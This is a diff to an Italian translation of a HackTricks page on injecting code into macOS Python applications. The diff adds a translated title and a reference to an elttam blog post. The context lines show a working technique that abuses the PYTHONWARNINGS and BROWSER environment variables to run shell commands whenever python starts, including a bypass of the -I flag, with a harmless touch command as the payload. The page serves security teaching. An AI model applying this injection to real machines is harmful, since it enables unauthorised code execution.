@@ -1,10 +1,10 @@
-# macOS Python Applications Injection
+# Injection nelle applicazioni Python di macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`
 
-È possibile modificare entrambe le variabili d'ambiente per eseguire codice arbitrario ogni volta che viene chiamato python, ad esempio:
+È possibile modificare entrambe le variabili d'ambiente per eseguire codice arbitrario ogni volta che viene chiamato python, ad esempio:<sup>[[1]](#references)</sup>
 ```bash
 # Generate example python script
 echo "print('hi')" > /tmp/script.py
@@ -15,4 +15,8 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 # RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
+## Riferimenti
+
+- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
+
 {{#include ../../../banners/hacktricks-training.md}}
